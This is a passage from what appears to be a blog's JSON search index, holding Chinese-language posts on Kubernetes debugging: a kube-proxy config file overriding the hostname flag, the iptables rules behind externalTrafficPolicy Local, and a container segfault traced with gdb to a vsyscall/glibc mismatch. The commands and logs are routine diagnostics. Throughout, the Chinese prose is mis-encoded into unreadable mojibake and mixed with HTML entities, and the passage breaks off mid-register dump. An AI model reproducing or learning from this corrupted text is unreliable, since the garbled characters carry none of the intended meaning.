&#123;è¿™ä¸ªé€»è¾‘è¢«è§¦å‘äº†ï¼Œä¹Ÿå°±è¯´ sandboxçš„ container çš„docker state pidä¸º0ã€‚","tags":["k8s"]},{"title":"kube-proxy é…ç½®ä¸å½“å¯¼è‡´ service å¼‚å¸¸","path":"/2020/05/25/kube-proxy-configure-error/","content":"ä¹‹å‰è°ƒç ” nlb åç«¯è·å–çœŸå® ip çš„ç‰¹æ€§ï¼Œå‘ç°å½“ kube-proxy æŠ¥é”™å¦‚ä¸‹çš„æ—¶å€™å°±ä¼šå‘ç”Ÿç”Ÿæˆçš„ iptables è§„åˆ™ä¸ç¬¦åˆé¢„æœŸï¼Œå³ä¸¢å¼ƒå½“å‰ service node port çš„æµé‡ã€‚ 1-A KUBE-XLB-HCMTY43AHEJZZDHI -m comment --comment &quot;2048-game/service-2048: has no local endpoints&quot; -j KUBE-MARK-DROP å®é™…æƒ…å†µæ˜¯å½“å‰èŠ‚ç‚¹ä¸Šè¿è¡Œç€ pod 12345$ kubectl --kubeconfig kubeconfig -n 2048-game get pod -o wideNAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE2048-deployment-7bddb7dc45-c2dk6 1/1 Running 0 109m 10.188.166.183 ip-10-188-166-140.ec2.internal &lt;none&gt;2048-deployment-7bddb7dc45-nc88f 1/1 Running 0 109m 10.188.166.232 ip-10-188-166-140.ec2.internal &lt;none&gt; è€Œ kubelet çš„å¥åº·æ£€æŸ¥å´è¯´æ²¡æœ‰ 12345678# curl http://10.188.166.140:32198&#123;\t&quot;service&quot;: &#123; &quot;namespace&quot;: &quot;2048-game&quot;, &quot;name&quot;: &quot;service-2048&quot;\t&#125;,\t&quot;localEndpoints&quot;: 0&#125; é”™è¯¯ä¿¡æ¯æ”¶é›†æ£€æŸ¥ kube-proxy æ—¥å¿—å‘ç°æ˜¯ kube-proxy è§£æ ip åœ°å€æœ‰æŠ¥é”™ä¿¡æ¯ 123W0525 07:13:03.916890 1 server.go:604] Failed to retrieve node info: nodes &quot;ip-10-188-166-140&quot; not foundI0525 07:13:03.916921 1 server_others.go:148] Using iptables Proxier.W0525 07:13:03.917047 1 proxier.go:312] invalid nodeIP, initializing kube-proxy with 127.0.0.1 as nodeIP åœ¨ kube-proxy çš„é€»è¾‘ä¸­ï¼Œè¿™ä¸ª ip åœ°å€éœ€è¦å’Œ endpoint å¯¹è±¡ä¸­çš„ nodeName åšé‡Œé¢çš„åœ°å€åŒ¹é… 1234567891011121314....subsets:- addresses: - ip: 10.188.166.183 nodeName: ip-10-188-166-140.ec2.internal targetRef: kind: Pod name: 2048-deployment-7bddb7dc45-c2dk6 namespace: 2048-game resourceVersion: &quot;1695104&quot; uid: e52b247a-9e51-11ea-b101-02d6ecb85825 - ip: 10.188.166.232 nodeName: ip-10-188-166-140.ec2.internal ... çœ‹ä¸‹ kube-proxy çš„å¯åŠ¨å…³é”®å‚æ•° 12345...I0525 07:13:03.848460 1 flags.go:33] FLAG: --bind-address=&quot;0.0.0.0&quot;...I0525 07:13:03.848697 1 flags.go:33] FLAG: --hostname-override=&quot;ip-10-188-166-140.ec2.internal&quot;... ä»£ç é€»è¾‘åˆ†æ12345678910111213141516171819func NewProxier(ipt utiliptables.Interface,\tsysctl utilsysctl.Interface,\texec utilexec.Interface,\tsyncPeriod time.Duration,\tminSyncPeriod time.Duration,\tmasqueradeAll bool,\tmasqueradeBit int,\tclusterCIDR string,\thostname string,\tnodeIP net.IP,\trecorder record.EventRecorder,\thealthzServer healthcheck.HealthzUpdater,\tnodePortAddresses []string,) (*Proxier, error) &#123;...\tif nodeIP == nil &#123; glog.Warningf(&quot;invalid nodeIP, initializing kube-proxy with 127.0.0.1 as nodeIP&quot;) // é”™è¯¯ä¿¡æ¯ nodeIP = net.ParseIP(&quot;127.0.0.1&quot;)\t&#125; 12345678910111213nodeIP := net.ParseIP(config.BindAddress) // è¿™é‡Œé€šè¿‡æ—¥å¿—çœ‹åˆ°çš„è¾“å…¥ 0.0.0.0if nodeIP.IsUnspecified() &#123; // è¿™é‡Œé€»è¾‘åº”è¯¥æ˜¯å‘½ä¸­äº†ï¼Œä¸º true\tnodeIP = getNodeIP(client, hostname)&#125;if proxyMode == proxyModeIPTables &#123;\tglog.V(0).Info(&quot;Using iptables Proxier.&quot;)\tif config.IPTables.MasqueradeBit == nil &#123; // MasqueradeBit must be specified or defaulted. return nil, fmt.Errorf(&quot;unable to read IPTables MasqueradeBit from config&quot;)\t&#125;\t// TODO this has side effects that should only happen when Run() is invoked.\tproxierIPTables, err := iptables.NewProxier( 1234567891011121314func getNodeIP(client clientset.Interface, hostname string) net.IP &#123;\tvar nodeIP net.IP\tnode, err := client.CoreV1().Nodes().Get(hostname, metav1.GetOptions&#123;&#125;)\tif err != nil &#123; glog.Warningf(&quot;Failed to retrieve node info: %v&quot;, err) // è¿™ä¸ªé”™è¯¯ä¿¡æ¯ä¹Ÿå‘½ä¸­ï¼Œå€¼ä¸º ip-10-188-166-140 return nil\t&#125;\tnodeIP, err = utilnode.GetNodeHostIP(node)\tif err != nil &#123; glog.Warningf(&quot;Failed to retrieve node IP: %v&quot;, err) return nil\t&#125;\treturn nodeIP&#125; è¿™ä¸ªé”™è¯¯ä¿¡æ¯å°±å¾ˆå¥‡æ€ªï¼Œæ˜æ˜å‰é¢å·²ç»å¯åŠ¨äº† --hostname-override=&quot;ip-10-188-166-140.ec2.internal&quot;ï¼Œä¸ºå•¥è¿˜æ˜¯å»è·å–çš„ä¸»æœºåç§°æ˜¯ip-10-188-166-140ã€‚ 12345// Create event recorderchostname, err := utilnode.GetHostname(config.HostnameOverride)if err != nil &#123;\treturn nil, err&#125; çœ‹åˆ°äº†å˜é‡äº§ç”Ÿçš„åœ°æ–¹ï¼Œè¿™ä¸ªå‡½æ•°utilnode.GetHostname()ç»è¿‡å•å…ƒæµ‹è¯•utilnode.GetHostname(ip-10-188-166-140.ec2.internal)è¿”å›å€¼æ˜¯ip-10-188-166-140.ec2.internalï¼Œä¹Ÿæ˜¯ç¬¦åˆé¢„æœŸçš„ã€‚ é‚£å°±é¡ºè—¤æ’æŸ¥config.HostnameOverrideå˜é‡ï¼Œå‘ç°æ˜¯å¦‚ä¸‹çš„å‘½ä»¤è¡Œå‚æ•°æ¸²æŸ“ä¸Šæ¥çš„ 1fs.StringVar(&amp;o.config.HostnameOverride, &quot;hostname-override&quot;, o.config.HostnameOverride, &quot;If non-empty, will use this string as identification instead of the actual hostname.&quot;) æœ‰ç‚¹è¿·ï¼Œä¸èƒ½è·³ç€çœ‹ã€‚ ç»§ç»­çœ‹config.HostnameOverrideè¿™ä¸ªå˜é‡çš„ç»“æ„ä½“configç”Ÿæˆã€‚ 12345678910111213141516func newProxyServer(\tconfig *proxyconfigapi.KubeProxyConfiguration,\tcleanupAndExit bool,\tcleanupIPVS bool,\tscheme *runtime.Scheme,\tmaster string) (*ProxyServer, error) &#123;\tif config == nil &#123; return nil, errors.New(&quot;config is required&quot;)\t&#125;... ç§»é™¤ä¸ç›¸å…³ä»£ç \t// Create event recorderc\thostname, err := utilnode.GetHostname(config.HostnameOverride)\tif err != nil &#123; return nil, err\t&#125; èµ°è¯»å¦‚ä¸Šä»£ç å‘ç°æ˜¯å‘ç°configå¯¹è±¡å…¶å®æ˜¯å‚æ•°ä¼ å…¥çš„ï¼Œå¹¶ä¸”æ²¡æœ‰ç‰¹åˆ«çš„ä¿®æ”¹ã€‚ 1234// NewProxyServer returns a new ProxyServer.func NewProxyServer(o *Options) (*ProxyServer, error) &#123;\treturn newProxyServer(o.config, o.CleanupAndExit, o.CleanupIPVS, o.scheme, o.master)&#125; è°ƒç”¨ NewProxyServer()å‡½æ•°çš„æ˜¯Run()ä¸­è¢«è°ƒç”¨ï¼Œèµ°è¯»äº†ä¸€ä¸‹æ²¡æœ‰å‘ç°å¼‚å¸¸ã€‚ç»§ç»­çœ‹ä¸€ä¸‹Run()å‡½æ•°è¢«è°ƒç”¨çš„åœ°æ–¹ 12345678func (o *Options) Run() error &#123;\tif len(o.WriteConfigTo) &gt; 0 &#123; return o.writeConfigFile()\t&#125;\tproxyServer, err := NewProxyServer(o)...&#125; Run() æ˜¯NewOptions()è¿”å›å¯¹è±¡çš„æ–¹æ³•ï¼Œ 123456789101112131415161718192021222324252627282930313233343536// NewProxyCommand creates a *cobra.Command object with default parametersfunc NewProxyCommand() *cobra.Command &#123;\topts := NewOptions()\tcmd := &amp;cobra.Command&#123; ... Run: func(cmd *cobra.Command, args []string) &#123; verflag.PrintAndExitIfRequested() utilflag.PrintFlags(cmd.Flags()) if err := initForOS(opts.WindowsService); err != nil &#123; glog.Fatalf(&quot;failed OS init: %v&quot;, err) &#125; if err := opts.Complete(); err != nil &#123; glog.Fatalf(&quot;failed complete: %v&quot;, err) &#125; if err := opts.Validate(args); err != nil &#123; glog.Fatalf(&quot;failed validate: %v&quot;, err) &#125; glog.Fatal(opts.Run()) &#125;,\t&#125;\tvar err error\topts.config, err = opts.ApplyDefaults(opts.config)\tif err != nil &#123; glog.Fatalf(&quot;unable to create flag defaults: %v&quot;, err)\t&#125;\topts.AddFlags(cmd.Flags())\tcmd.MarkFlagFilename(&quot;config&quot;, &quot;yaml&quot;, &quot;yml&quot;, &quot;json&quot;)\treturn cmd&#125; çœ‹ä¸Šé¢ä»£ç çŸ¥é“NewProxyCommandè¿”å›çš„æ˜¯*cobra.Commandå¯¹è±¡ï¼Œè¿™ä¸ªæ¡†æ¶ä¸­å®é™…æ‰§è¡Œçš„å°±æ˜¯Runå­—æ®µçš„å®ç°ã€‚ 1234567891011121314151617181920212223// Complete completes all the required options.func (o *Options) Complete() error &#123;\tif len(o.ConfigFile) == 0 &amp;&amp; len(o.WriteConfigTo) == 0 &#123; glog.Warning(&quot;WARNING: all flags other than --config, --write-config-to, and --cleanup are deprecated. Please begin using a config file ASAP.&quot;) o.applyDeprecatedHealthzPortToConfig()\t&#125;\t// Load the config file here in Complete, so that Validate validates the fully-resolved config.\tif len(o.ConfigFile) &gt; 0 &#123; if c, err := o.loadConfigFromFile(o.ConfigFile); err != nil &#123; // è¿™é‡Œè¦†ç›–äº† return err &#125; else &#123; o.config = c &#125;\t&#125;\terr := utilfeature.DefaultFeatureGate.SetFromMap(o.config.FeatureGates)\tif err != nil &#123; return err\t&#125;\treturn nil&#125; çœ‹äº†ä¸Šé¢ä»£ç å¿ƒå‡‰äº†ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘æŒ‡å®šäº†é…ç½®æ–‡ä»¶é‚£ä¹ˆå‘½ä»¤è¡Œè®¾ç½®çš„flagä¹Ÿå°±ä¸ç”Ÿæ•ˆäº†ã€‚ éªŒè¯ç»“è®º12345678910/usr/local/bin/kube-proxy --hostname-override=ip-10-188-166-140.ec2.internal --v=8...I0525 10:19:12.711084 1543 flags.go:33] FLAG: --hostname-override=&quot;ip-10-188-166-140.ec2.internal&quot;...W0525 10:19:12.711412 1543 server.go:194] WARNING: all flags other than --config, --write-config-to, and --cleanup are deprecated. Please begin using a config file ASAP.I0525 10:19:12.711447 1543 feature_gate.go:206] feature gates: &amp;&#123;map[]&#125;I0525 10:19:12.713822 1543 iptables.go:611] couldn&#x27;t get iptables-restore version; assuming it doesn&#x27;t support --waitI0525 10:19:12.721048 1543 server.go:412] Neither kubeconfig file nor master URL was specified. Falling back to in-cluster config.W0525 10:19:12.722352 1543 server_others.go:295] Flag proxy-mode=&quot;&quot; unknown, assuming iptables proxyI0525 10:19:12.723544 1543 round_trippers.go:383] GET https://192.168.0.1:443/api/v1/nodes/ip-10-188-166-140.ec2.internal ç¬¦åˆä»£ç åˆ†æï¼Œå‡¡äº‹æŒ‡å®šconfigå°±ä»¥è¿™ä¸ªé…ç½®æ–‡ä»¶çš„å†…å®¹ä¸ºå‡†ï¼Œæ²¡æœ‰å°±ä»¥å‘½ä»¤è¡Œçš„flagä¸ºå‡†ã€‚ åé¢åˆçœ‹äº†ä¸€ä¸‹kubeletçš„é…ç½®å‚æ•°ï¼Œå‘ç°åœ¨ kubeletè®¾è®¡ä¸­å¦‚æœfalgå’Œ é…ç½®æ–‡ä»¶ä¸­åŒæ—¶æŒ‡å®šï¼Œå‘½ä»¤è¡Œå‚æ•°è®¾å®šå€¼å…·æœ‰æ›´é«˜çš„ä¼˜å…ˆçº§ã€‚ çœ‹ä¸Šå»æ˜¯ä¸ªä¸Šæ¸¸bugï¼Œåœ¨å½“å‰æœ€æ–°ç‰ˆæœ¬æœ‰æ²¡æœ‰è¿™æ ·çš„é—®é¢˜æœ‰å¾…ç¡®è®¤ã€‚","tags":["k8s"]},{"title":"service externalTrafficPolicy æ¢ç©¶","path":"/2020/05/20/service-traffic-local/","content":"å› ä¸ºä¸šåŠ¡éœ€è¦åœ¨PODä¸­è·å–å®¢æˆ·ç«¯çš„æ­£å¼åœ°å€ï¼Œé€šè¿‡è°ƒç ”å‘ç°åªè¦åˆ›å»ºserviceçš„æ˜¯spec.externalTrafficPolicy å­—æ®µæŒ‡å®šä¸ºLocalå³å¯ã€‚ è¿™ç‰‡æ–‡ç« æ¢ç©¶ä¸€ä¸‹Localè¿™ä¸ªå­—æ®µæ˜¯å¦‚ä½•å®ç°çš„ã€‚ åˆ›å»ºä¸€ä¸ª service å±•ç¤ºå¦‚ä¸‹ï¼Œä¹‹æ‰€ä»¥ä½¿ç”¨ nlb æ˜¯å› ä¸º aws çš„ nlbæ˜¯å¯ä»¥é€ä¼ å®¢æˆ·ç«¯åŸåœ°å€ã€‚ 12345678910111213141516apiVersion: v1kind: Servicemetadata: annotations: service.beta.kubernetes.io/aws-load-balancer-type: nlb name: &quot;service-2048-local&quot; namespace: &quot;2048-game&quot;spec: type: LoadBalancer externalTrafficPolicy: Local ports: - port: 80 targetPort: 80 protocol: TCP selector: name: &quot;2048-game&quot; 123$ kubectl --kubeconfig kubeconfig -n 2048-game get svc -o wideNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE SELECTORservice-2048-local LoadBalancer 192.168.104.28 a7c77732499c111ea9b5f02d6ecb8582-1465649123.us-east-1.elb.amazonaws.com 80:30636/TCP 22h name=2048-game service çš„ externalTrafficPolicyçš„é»˜è®¤é…ç½®æ˜¯ClusterIPï¼Œå¦‚æœä½¿ç”¨é»˜è®¤çš„å€¼ï¼Œå‡ºäºå¯¹kubernetesä¸cloud-provider-awsçš„ç†è§£ï¼Œæˆ‘çŸ¥é“å½“æˆ‘æµé‡é€šè¿‡ nlbä¼šè¢« targetgroupè½¬å‘åˆ°æœºå™¨çš„nodeportï¼Œç„¶åè¢«è½¬å‘åˆ°ç›®æ ‡å®¹å™¨ä¸­ã€‚ å¦‚æœæŒ‡å®šäº† externalTrafficPolicy ä¸º localå¯ä»¥å°†æµé‡è½¬å‘åªä¼šè¢«è½¬å‘åˆ°è¿è¡ŒPODçš„èŠ‚ç‚¹ä¸Šã€‚åœ¨ AWS ä¸Šåšåˆ°è¿™æ ·çš„æ•ˆæœæ˜¯å¾—ç›Šäºnlbçš„å¥åº·æ£€æŸ¥ï¼Œtargetgroupçš„å¥åº·æ£€æŸ¥ä¼šå‘ç°æ²¡æœ‰è¿è¡Œ POD çš„healthCheckç«¯å£æ˜¯ä¸é€šçš„ã€‚ targetgroup k8s æ˜¯å¦‚ä½•å®ç°é€šè¿‡ serviceçš„æ–‡ä»¶æˆ‘çŸ¥é“äº†å¥åº·æ£€æŸ¥ç«¯å£æ˜¯30965ï¼Œåœ¨é›†ç¾¤çš„ä¸¤ä¸ªèŠ‚ç‚¹ä¸Šæ¢æŸ¥å¥åº·æ£€æŸ¥çš„ç«¯å£ 12345678# curl http://10.188.166.140:30965//healthz&#123;\t&quot;service&quot;: &#123; &quot;namespace&quot;: &quot;2048-game&quot;, &quot;name&quot;: &quot;service-2048-local&quot;\t&#125;,\t&quot;localEndpoints&quot;: 2&#125; 12345678# curl http://10.188.166.141:30965//healthz&#123;\t&quot;service&quot;: &#123; &quot;namespace&quot;: &quot;2048-game&quot;, &quot;name&quot;: &quot;service-2048-local&quot;\t&#125;,\t&quot;localEndpoints&quot;: 0&#125; kube-proxyå°±æ ¹æ®ä¸Šé¢çš„ä¸¤ä¸ªåœ°æ–¹çš„å·®å¼‚ç”Ÿæˆä¸åŒçš„ iptablesè§„åˆ™ï¼Œå¦‚æœå½“å‰èŠ‚ç‚¹å¥åº·æ£€æŸ¥localEndpointsä¸ä¸º0ï¼Œé‚£ä¹ˆå½“å‰èŠ‚ç‚¹å°±ä¼šç”Ÿæˆè½¬å‘è§„åˆ™æŒ‡å‘ç›®æ ‡å®¹å™¨ï¼Œå¦‚æœæ²¡æœ‰å°±ç”ŸæˆDROPè§„åˆ™ä¸¢å¼ƒnlbçš„å¥åº·æ£€æŸ¥ï¼Œè¿™æ ·æµé‡å°±ä¸ä¼šè¢«è½¬å‘åˆ°è¿™ä¸ªæ²¡æœ‰è¿è¡ŒPODçš„èŠ‚ç‚¹ä¸Šã€‚ è¿è¡Œ POD èŠ‚ç‚¹çš„è½¬å‘è§„åˆ™å½“å‰çš„ serviceçš„externalTrafficPolicyä¸ºlocal 1234567891011121314151617# iptables-save | grep 30687-A KUBE-NODEPORTS -s 127.0.0.0/8 -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-MARK-MASQ-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-XLB-66B67NPFXW65VVJM# iptables-save | grep KUBE-XLB-66B67NPFXW65VVJM:KUBE-XLB-66B67NPFXW65VVJM - [0:0]-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-XLB-66B67NPFXW65VVJM-A KUBE-XLB-66B67NPFXW65VVJM -s 10.188.166.0/24 -m comment --comment &quot;Redirect pods trying to reach external loadbalancer VIP to clusterIP&quot; -j KUBE-SVC-66B67NPFXW65VVJM-A KUBE-XLB-66B67NPFXW65VVJM -m comment --comment &quot;Balancing rule 0 for 2048-game/service-2048-local:&quot; -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-TVXZJYL67XY2CHS2-A KUBE-XLB-66B67NPFXW65VVJM -m comment --comment &quot;Balancing rule 1 for 2048-game/service-2048-local:&quot; -j KUBE-SEP-UCWOW7PLEZDILT5N# iptables-save | grep KUBE-SEP-TVXZJYL67XY2CHS2:KUBE-SEP-TVXZJYL67XY2CHS2 - [0:0]-A KUBE-SEP-TVXZJYL67XY2CHS2 -s 10.188.166.159/32 -j KUBE-MARK-MASQ-A KUBE-SEP-TVXZJYL67XY2CHS2 -p tcp -m tcp -j DNAT --to-destination 10.188.166.159:80 // here is-A KUBE-SVC-66B67NPFXW65VVJM -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-TVXZJYL67XY2CHS2-A KUBE-XLB-66B67NPFXW65VVJM -m comment --comment &quot;Balancing rule 0 for 2048-game/service-2048-local:&quot; -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-TVXZJYL67XY2CHS2 å¯ä»¥çœ‹åˆ°ç›´æ¥ DANT å‡ºå»äº† æ²¡æœ‰è¿è¡Œ POD èŠ‚ç‚¹çš„è½¬å‘è§„åˆ™å½“å‰çš„ serviceçš„externalTrafficPolicyä¸ºlocal 123456789# iptables-save | grep 30687-A KUBE-NODEPORTS -s 127.0.0.0/8 -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-MARK-MASQ-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-XLB-66B67NPFXW65VVJM# iptables-save | grep KUBE-XLB-66B67NPFXW65VVJM:KUBE-XLB-66B67NPFXW65VVJM - [0:0]-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-XLB-66B67NPFXW65VVJM-A KUBE-XLB-66B67NPFXW65VVJM -s 10.188.166.0/24 -m comment --comment &quot;Redirect pods trying to reach external loadbalancer VIP to clusterIP&quot; -j KUBE-SVC-66B67NPFXW65VVJM-A KUBE-XLB-66B67NPFXW65VVJM -m comment --comment &quot;2048-game/service-2048-local: has no local endpoints&quot; -j KUBE-MARK-DROP å¯ä»¥çœ‹åˆ°DROPçš„è§„åˆ™ï¼Œnlbåšå¥åº·æ£€æŸ¥éƒ½ä¸ä¼šé€šè¿‡ï¼Œæµé‡ä¹Ÿå°±ä¸ä¼šåˆ°è¿™ä¸ªæ²¡æœ‰è¿è¡ŒPODçš„èŠ‚ç‚¹ä¸Šã€‚ ç®€å•å›é¡¾ä¸€ä¸‹externalTrafficPolicyä¸ºCluster123# iptables-save | grep 30687-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-MARK-MASQ-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-SVC-66B67NPFXW65VVJM 123456# iptables-save | grep KUBE-SVC-66B67NPFXW65VVJM:KUBE-SVC-66B67NPFXW65VVJM - [0:0]-A KUBE-NODEPORTS -p tcp -m comment --comment &quot;2048-game/service-2048-local:&quot; -m tcp --dport 30687 -j KUBE-SVC-66B67NPFXW65VVJM-A KUBE-SERVICES -d 192.168.61.194/32 -p tcp -m comment --comment &quot;2048-game/service-2048-local: cluster IP&quot; -m tcp --dport 80 -j KUBE-SVC-66B67NPFXW65VVJM-A KUBE-SVC-66B67NPFXW65VVJM -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-TVXZJYL67XY2CHS2-A KUBE-SVC-66B67NPFXW65VVJM -j KUBE-SEP-UCWOW7PLEZDILT5N 12345# iptables-save | grep KUBE-SEP-TVXZJYL67XY2CHS2:KUBE-SEP-TVXZJYL67XY2CHS2 - [0:0]-A KUBE-SEP-TVXZJYL67XY2CHS2 -s 10.188.166.159/32 -j KUBE-MARK-MASQ-A KUBE-SEP-TVXZJYL67XY2CHS2 -p tcp -m tcp -j DNAT --to-destination 10.188.166.159:80-A KUBE-SVC-66B67NPFXW65VVJM -m statistic --mode random --probability 0.50000000000 -j KUBE-SEP-TVXZJYL67XY2CHS2 12-A KUBE-SEP-TVXZJYL67XY2CHS2 -p tcp -m tcp -j DNAT --to-destination 10.188.166.159:80-A KUBE-SEP-UCWOW7PLEZDILT5N -s 10.188.166.186/32 -j KUBE-MARK-MASQ å¯ä»¥çœ‹åˆ°æœ€ä¸€ä¸ªæ˜¯åšIPåœ°å€çš„ä¼ªè£…ï¼Œè‡ªåŠ¨é€‰æ‹©åˆé€‚çš„åœ°å€åšåŸåœ°å€è½¬æ¢ã€‚","tags":["k8s"]},{"title":"å®¹å™¨ä¸­ glibc å…¼å®¹é—®é¢˜","path":"/2020/05/11/glibc/","content":"ä»Šå¤©åŒäº‹åœ¨çº¿ä¸ŠåšDebainç‰ˆæœ¬å‡çº§é‡åˆ°é—®é¢˜ 123456# kubectl exec -it fqh-realserver-01-69586d7c74-dd9cl bashcommand terminated with exit code 139# apt-get updateE: Method http has died unexpectedly!E: Sub-process http received a segmentation fault. å¯ä»¥çœ‹åˆ°é”™è¯¯ä»£ç æ˜¯ 139 æ˜¯å®¢æˆ·ç«¯æŠ¥é”™ï¼Œå†çœ‹ä¸€ä¸‹å†…æ ¸æ—¥å¿— 123May 11 16:11:20 xxx kernel: [5790773.000196] bash[231251] vsyscall attempted with vsyscall=none ip:ffffffffff600400 cs:33 sp:7ffc7942aad8 ax:ffffffffff600400 si:7ffc7942af76 di:0May 11 16:11:20 xxx kernel: [5790773.000200] bash[231251]: segfault at ffffffffff600400 ip ffffffffff600400 sp 00007ffc7942aad8 error 15May 11 16:11:20 xxx kernel: [5790773.000202] Code: Bad RIP value. é—®é¢˜åˆ†æé”™è¯¯ä¿¡æ¯å°±æ€€ç–‘æ˜¯ ABI å±‚é¢çš„å…¼å®¹é—®é¢˜ï¼Œè¦éªŒè¯æƒ³æ³•å°±è¦çœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆå‘ç”Ÿ segmentation faultã€‚ æ„é€ ä¸€ä¸‹æµ‹è¯•ç¯å¢ƒï¼Œåœ¨ä¸€ä¸ªç»ˆç«¯å¯åŠ¨ä¸€ä¸ª dockerï¼Œå› ä¸º docker æ˜¯ c&#x2F;s æ¨¡å‹ï¼Œæ²¡æœ‰å¿…è¦åœ¨å®¢æˆ·ç«¯ debugï¼Œå®¢æˆ·ç«¯ä»…ä»…æ˜¯ä¸ªå‘è¯·æ±‚çš„å·¥å…·ã€‚ 12# /usr/bin/docker run -it dockerhub.nie.netease.com/frosty/sea sh# å› ä¸ºæˆ‘å‘ç°é•œåƒé‡Œé¢çš„ sh æ˜¯å¯ä»¥å¯åŠ¨ï¼Œé€šè¿‡ sh å…ˆå°† container è¿è¡Œèµ·æ¥ï¼Œä»»ä½•å† container è¿è¡Œå…¶ä»–æŒ‡ä»¤ã€‚ å¯ä»¥å¯çœ‹åˆ° containerï¼Œè·å–è¿™ä¸ª container çš„ PIDï¼Œä¹Ÿå°±æ˜¯å®¿ä¸»å±‚é¢çš„è§†è§’çš„ container å®ä½“ã€‚ 123456789# docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES899eea8d3958 dockerhub.nie.netease.com/frosty/sea &quot;sh&quot; 4 seconds ago Up 3 seconds happy_galileo307eb53d45df e15788915c71 &quot;/usr/bin/cadvisor -â€¦&quot; 7 weeks ago Up 7 weeks k8s_cadvisor_kube-cadvisor-d429r_kube-system_5b88b786-1ecc-4c63-9c10-2b4d5000d3bc_0076136a16137 dockerhub.nie.netease.com/whale/google_containers &quot;/pause&quot; 7 weeks ago Up 7 weeks k8s_POD_kube-cadvisor-d429r_kube-system_5b88b786-1ecc-4c63-9c10-2b4d5000d3bc_0# docker inspect 899eea8d3958 | grep Pid &quot;Pid&quot;: 2204330, &quot;PidMode&quot;: &quot;&quot;, &quot;PidsLimit&quot;: 0, gdb attach è¿›ç¨‹ï¼Œé™„åŠ ä¸Šå»å¹¶ç»§ç»­è¿è¡Œ containerï¼ˆè¿™ä¸ª gdb æˆ‘å®‰è£…äº† peda æ’ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748# gdb -q attach 2204330attach: No such file or directory.Attaching to process 2204330Reading symbols from target:/bin/dash...(no debugging symbols found)...done.Reading symbols from target:/lib/x86_64-linux-gnu/libc.so.6...(no debugging symbols found)...done.Reading symbols from target:/lib64/ld-linux-x86-64.so.2...(no debugging symbols found)...done.warning: Target and debugger are in different PID namespaces; thread lists and other data are likely unreliable. Connect to gdbserver inside the container.[----------------------------------registers-----------------------------------]RAX: 0xfffffffffffffe00RBX: 0x0RCX: 0x7f5da5a917d0 --&gt; 0x3173fffff0013d48RDX: 0x2000 (&#x27;&#x27;)RSI: 0x61a200 --&gt; 0x0RDI: 0x0RBP: 0x61a200 --&gt; 0x0RSP: 0x7ffdc70f6608 --&gt; 0x40881d (cmp eax,0x0)RIP: 0x7f5da5a917d0 --&gt; 0x3173fffff0013d48R8 : 0x7f5da5d48e40 --&gt; 0x100000000R9 : 0x7f5da5d48e90 --&gt; 0x0R10: 0x0R11: 0x246R12: 0x0R13: 0x1R14: 0x0R15: 0x0EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x7f5da5a917c7 &lt;read+7&gt;:\tjne 0x7f5da5a917d9 &lt;read+25&gt; 0x7f5da5a917c9 &lt;read+9&gt;:\tmov eax,0x0 0x7f5da5a917ce &lt;read+14&gt;:\tsyscall=&gt; 0x7f5da5a917d0 &lt;read+16&gt;:\tcmp rax,0xfffffffffffff001 0x7f5da5a917d6 &lt;read+22&gt;:\tjae 0x7f5da5a91809 &lt;read+73&gt; 0x7f5da5a917d8 &lt;read+24&gt;:\tret 0x7f5da5a917d9 &lt;read+25&gt;:\tsub rsp,0x8 0x7f5da5a917dd &lt;read+29&gt;:\tcall 0x7f5da5aaa240[------------------------------------stack-------------------------------------]0000| 0x7ffdc70f6608 --&gt; 0x40881d (cmp eax,0x0)0008| 0x7ffdc70f6610 --&gt; 0x10016| 0x7ffdc70f6618 --&gt; 0x00024| 0x7ffdc70f6620 --&gt; 0x00032| 0x7ffdc70f6628 --&gt; 0x40e9cd (mov ebx,eax)0040| 0x7ffdc70f6630 --&gt; 0x10048| 0x7ffdc70f6638 --&gt; 0x40ca67 (test ebp,ebp)0056| 0x7ffdc70f6640 --&gt; 0x1[------------------------------------------------------------------------------]Legend: code, data, rodata, value0x00007f5da5a917d0 in read () from target:/lib/x86_64-linux-gnu/libc.so.6 åˆ‡æ¢åˆ°å®¹å™¨é‡Œé¢æ‰§è¡Œ ldd ï¼ˆç†è®ºä¸Šä»»ä½•éé™æ€æ‰“åŒ…çš„ç¨‹åºéƒ½å¯ä»¥ 12# /usr/bin/docker run -it dockerhub.nie.netease.com/frosty/sea sh# ldd å‘ç°è¿›ç¨‹æ”¶åˆ° SIGSEGVä¿¡å·ï¼Œè€Œè¿™ä¸ªä¿¡å·çš„é»˜è®¤è¡Œä¸ºå°±æ˜¯ç»ˆæ­¢è¿›ç¨‹ã€‚ 12345678910111213141516171819202122232425262728293031323334[----------------------------------registers-----------------------------------]RAX: 0xffffffffff600400RBX: 0x7ffd0d88cf60 (&quot;/bin/bash&quot;)RCX: 0x7361622f6e69622f (&#x27;/bin/bas&#x27;)RDX: 0x2f (&#x27;/&#x27;)RSI: 0x7ffd0d88cf60 (&quot;/bin/bash&quot;)RDI: 0x0RBP: 0x0RSP: 